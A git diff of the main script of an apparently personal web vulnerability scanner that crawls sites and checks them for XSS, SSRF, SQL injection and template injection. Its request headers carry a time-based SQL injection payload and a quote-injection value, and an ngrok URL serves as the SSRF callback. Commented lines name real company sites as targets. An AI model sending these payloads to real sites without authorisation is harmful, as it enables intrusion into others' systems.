@@ -1,17 +1,6 @@
-import os
-
 import sublist3r
-from tldextract import tldextract
-
 from Managers.CacheManager import CacheManager
-from Managers.CookieManager import CookieManager
-from Managers.Hakrawler import Hakrawler
-from Managers.LinksManager import LinksManager
-from Managers.FormRequestFetcher import FormRequestFetcher
-from Managers.SqliManager import SqliManager
-from Managers.SsrfManager import SsrfManager
-from Managers.SstiManager import SstiManager
-from Managers.XssManager import XssManager
+from Managers.ThreadManager import ThreadManager
 
 headers = {
     'Cache-Control': 'max-age=0',
@@ -20,61 +9,24 @@ headers = {
     'X-Forwarded-For': 'XOR(if(1=1,sleep(5),0))OR',
     'X-API-KEY': 'xapikeypoc\'',
 }
-
-
-def get_start_urls(file_path):
-    if os.path.exists(file_path):
-        return set(line.strip() for line in open(file_path))
+max_depth = 3
+batch_size = 20
+download_path = "C:\\Users\\oleksandr oliinyk\\Downloads"
+ngrok_url = 'http://79da-91-196-101-94.ngrok.io/'
 
 
 def main():
-    max_depth = 1
-    download_path = "C:\\Users\\oleksandr oliinyk\\Downloads"
     # start_url = "https://www.deere.com/en/mowers/lawn-tractors/"
     # start_url = "https://oriondemo.solarwinds.com/Orion/SummaryView.aspx?ViewID=1"
+    # subdomains = sublist3r.main(domain, 40, f'SublisterResult/{domain}_subdomains.txt', ports=None, silent=False,
+    # verbose=False, enable_bruteforce=False, engines=None)
 
-    urls = get_start_urls(f'{download_path}\\urls.txt')
+    # CacheManager.clear_all()
 
-    CacheManager.clear_all()
+    thread_man = ThreadManager(batch_size, download_path, max_depth, headers, ngrok_url)
 
-    for start_url in urls:
-        # start_url = "https://grameen.clabs.co/"
-        ngrok_url = 'http://4d58-212-90-183-35.ngrok.io/'
-        domain_parts = tldextract.extract(start_url)
-        domain = f'{domain_parts.domain}.{domain_parts.suffix}'
-
-        # subdomains = sublist3r.main(domain, 40, f'SublisterResult/{domain}_subdomains.txt', ports=None, silent=False, verbose=False,
-        #                             enable_bruteforce=False, engines=None)
-
-        # CacheManager.clear_all()
-
-        cookie_manager = CookieManager(domain, download_path)
-        raw_cookie = cookie_manager.get_raw_cookies()
-
-        # hakrawler = Hakrawler(domain, raw_cookie)
-        # get_dtos = hakrawler.get_requests_dtos(start_url)
-
-        cookies_dict = cookie_manager.get_cookies_dict(raw_cookie)
-        links_manager = LinksManager(domain, cookies_dict, headers, max_depth)
-        get_dtos = links_manager.get_all_links(start_url)
-
-        post_manager = FormRequestFetcher(domain)
-        post_dtos = post_manager.get_all_post_requests(get_dtos)
-
-        xss_manager = XssManager(domain, cookies_dict, headers)
-        xss_manager.check_get_requests(get_dtos)
-        xss_manager.check_form_requests(post_dtos)
-
-        ssrf_manager = SsrfManager(domain, cookies_dict, headers, ngrok_url)
-        ssrf_manager.check_get_requests(get_dtos)
-        ssrf_manager.check_form_requests(post_dtos)
-
-        sqli_manager = SqliManager(domain, cookies_dict, headers)
-        sqli_manager.check_get_requests(get_dtos)
-
-        ssti_manager = SstiManager(domain, cookies_dict, headers)
-        ssti_manager.check_get_requests(get_dtos)
-        ssti_manager.check_form_requests(post_dtos)
+    thread_man.run_all()
+    # thread_man.run_single(start_url)
 
 
 if __name__ == '__main__':
